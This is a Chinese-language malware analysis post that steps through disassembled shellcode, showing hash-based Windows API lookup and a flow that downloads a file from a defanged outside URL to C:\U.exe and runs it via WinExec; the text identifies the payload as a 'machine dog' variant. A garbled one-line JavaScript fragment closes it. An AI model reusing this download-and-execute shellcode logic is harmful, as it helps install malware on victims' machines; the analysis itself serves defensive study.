
# 从执行流程看 shellcode（一）\[附源代码\]

> 原文：[`www.pediy.com/kssd/pediy10/82327.html`](https://www.pediy.com/kssd/pediy10/82327.html)

## 1、shellcode 初始化代码

代码:

```
00401000 > $  8D85 70FEFFFF lea     eax, dword ptr \[ebp-190\]         ;  shellcode 初始化代码
00401006   .  50            push    eax                              ; /pWSAData
00401007   .  68 01010000   push    101                              ; |RequestedVersion = 101 (1.1.)
0040100C   .  FF15 18504000 call    dword ptr \[<&Ws2\_32.WSAStartup>\] ; \\WSAStartup
```

## 2、获取函数的运算部分代码:

```
00401020   .  EB 54         jmp     short 00401076            -------------------
00401022  /$  8B75 3C       mov     esi, dword ptr \[ebp+3C\]                      |
00401025  |.  8B7435 78     mov     esi, dword ptr \[ebp+esi+78\]                  |
00401029  |.  03F5          add     esi, ebp                                     |
0040102B  |.  56            push    esi                                          |
0040102C  |.  8B76 20       mov     esi, dword ptr \[esi+20\]
0040102F  |.  03F5          add     esi, ebp
00401031  |.  33C9          xor     ecx, ecx
00401033  |.  49            dec     ecx
00401034  |>  41            /inc     ecx
00401035  |.  AD            |lods    dword ptr \[esi\]                   这部分就是获取函数的运算部分
00401036  |.  33DB          |xor     ebx, ebx
00401038  |>  36:0FBE1428   |/movsx   edx, byte ptr ss:\[eax+ebp\]
0040103D  |.  38F2          ||cmp     dl, dh
0040103F  |.  74 08         ||je      short 00401049
00401041  |.  C1CB 0D       ||ror     ebx, 0D
00401044  |.  03DA          ||add     ebx, edx                                   |
00401046  |.  40            ||inc     eax                                        |
00401047  |.^ EB EF         |\\jmp     short 00401038                             |
00401049  |>  3BDF          |cmp     ebx, edi                                    |
0040104B  |.^ 75 E7         \\jnz     short 00401034   ----------------------------
```

## 3、shellcode 运行的整个流程，最终通过 hxxp://qq.18i16.net/exe1/lzz.css 下载指定的病毒到用户计算机上执行，通过分析，下载下来为机器狗的最新变种，美其名曰“牛”。代码:

```
00401090   .  8B40 3C       mov     eax, dword ptr \[eax+3C\]
00401093   >  95            xchg    eax, ebp                         ;  交换
00401094   .  BF 8E4E0EEC   mov     edi, EC0E4E8E                    ;  EDI 初始化
00401099   .  E8 84FFFFFF   call    00401022                         ;  获取到 kernel32.LoadLibraryA
0040109E   .  83EC 04       sub     esp, 4
004010A1   .  832C24 3C     sub     dword ptr \[esp\], 3C
004010A5   .  FFD0          call    eax                              ;  执行加载 urlmon.dll
004010A7   .  95            xchg    eax, ebp
004010A8   .  50            push    eax
004010A9   .  BF 361A2F70   mov     edi, 702F1A36
004010AE   .  E8 6FFFFFFF   call    00401022                         ;  urlmon.URLDownloadToFileA
004010B3   .  8B5424 FC     mov     edx, dword ptr \[esp-4\]
004010B7   .  8D52 BA       lea     edx, dword ptr \[edx-46\]          ;  执行后保存到本地的文件路径和名称 C:\\U.exe
004010BA   .  33DB          xor     ebx, ebx
004010BC   .  53            push    ebx
004010BD   .  53            push    ebx
004010BE   .  52            push    edx                              ;  C:\\U.exe 压栈
004010BF   .  EB 24         jmp     short 004010E5
004010C1   $  53            push    ebx
004010C2   .  FFD0          call    eax                              ;  hxxp://qq.18i16.net/exe1/lzz.css 执行下载
004010C4   .  5D            pop     ebp
004010C5   .  BF 98FE8A0E   mov     edi, 0E8AFE98                    ;  edi 初始化
004010CA   .  E8 53FFFFFF   call    00401022                         ;  获取到函数 kernel32.WinExec
004010CF   .  83EC 04       sub     esp, 4
004010D2   .  832C24 62     sub     dword ptr \[esp\], 62
004010D6   .  FFD0          call    eax                              ;  执行
004010D8   .  BF 7ED8E273   mov     edi, 73E2D87E
004010DD   .  E8 40FFFFFF   call    00401022                         ;  获取到函数 kernel32.ExitProcess
004010E2   .  52            push    edx
004010E3   .  FFD0          call    eax                              ; shellcode 执行完毕退出
004010E5   >  E8 D7FFFFFF   call    004010C1                         ; 获取到函数地址后开始执行动作
```

源代码：代码:

```
var huoqiang=window\"unescape\"\;
```
